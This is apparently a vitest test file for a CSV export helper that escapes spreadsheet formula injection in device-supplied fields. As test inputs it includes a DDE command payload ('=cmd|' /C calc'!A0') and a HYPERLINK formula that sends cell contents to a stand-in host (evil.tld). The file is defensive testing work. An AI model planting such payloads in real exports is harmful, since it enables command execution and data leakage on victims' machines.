import { describe, it, expect } from "vitest";
import {
  csvCell,
  generateCsvExport,
  generateSessionCsvExport,
  generateRuleResultsCsvExport,
  type SessionExportEvent,
  type SessionCsvData,
} from "../sessionExportUtils";

// CWE-1236: device-originated strings must reach the spreadsheet as inert text.
describe("csvCell", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])("neutralizes a leading %j", (ch) => {
    expect(csvCell(`${ch}1+1`)).toBe(`"'${ch}1+1"`);
  });

  it("neutralizes DDE / HYPERLINK payloads", () => {
    expect(csvCell("=cmd|' /C calc'!A0")).toBe(`"'=cmd|' /C calc'!A0"`);
    expect(csvCell('=HYPERLINK("https://evil.tld/x?"&A1,"x")')).toBe(
      `"'=HYPERLINK(""https://evil.tld/x?""&A1,""x"")"`
    );
  });

  it("leaves ordinary values untouched apart from quoting", () => {
    expect(csvCell("Hello world")).toBe('"Hello world"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("")).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell("a=b")).toBe('"a=b"');
  });
});

describe("CSV exports neutralize device-controlled fields", () => {
  it("event export", () => {
    const ev: SessionExportEvent = {
      eventId: "e1", sessionId: "s1", tenantId: "t1", timestamp: "2026-01-01T00:00:00Z",
      eventType: "=evil", severity: "Info", source: "+src", phase: 0,
      message: "=1+1", sequence: 1, data: { k: "v" },
    };
    const row = generateCsvExport([ev]).split("\n")[1];
    expect(row).toContain(`"'=evil"`);
    expect(row).toContain(`"'+src"`);
    expect(row).toContain(`"'=1+1"`);
    expect(row).not.toMatch(/,"[=+\-@]/);
  });

  it("session export", () => {
    const s: SessionCsvData = {
      sessionId: "s1", tenantId: "t1", serialNumber: "-SN", deviceName: "@dev",
      manufacturer: "=M", model: "+Mod", startedAt: "2026-01-01T00:00:00Z",
      currentPhase: 0, status: "Failed", eventCount: 0, failureReason: "=cmd|' /C calc'!A0",
      durationSeconds: 0, diagnosticsBlobName: "=blob",
    };
    const row = generateSessionCsvExport(s).split("\n")[1];
    expect(row).not.toMatch(/(^|,)"[=+\-@\t\r]/);
    expect(row).toContain(`"'=cmd|' /C calc'!A0"`);
  });

  it("rule results export", () => {
    const row = generateRuleResultsCsvExport([{
      resultId: "r", sessionId: "s", tenantId: "t", ruleId: "R", ruleTitle: "T",
      severity: "High", category: "C", confidenceScore: 1, explanation: "=exp",
      remediation: [], relatedDocs: [], matchedConditions: { x: 1 }, detectedAt: "2026-01-01T00:00:00Z",
    }]).split("\n")[1];
    expect(row).toContain(`"'=exp"`);
    expect(row).not.toMatch(/(^|,)"[=+\-@\t\r]/);
  });
});
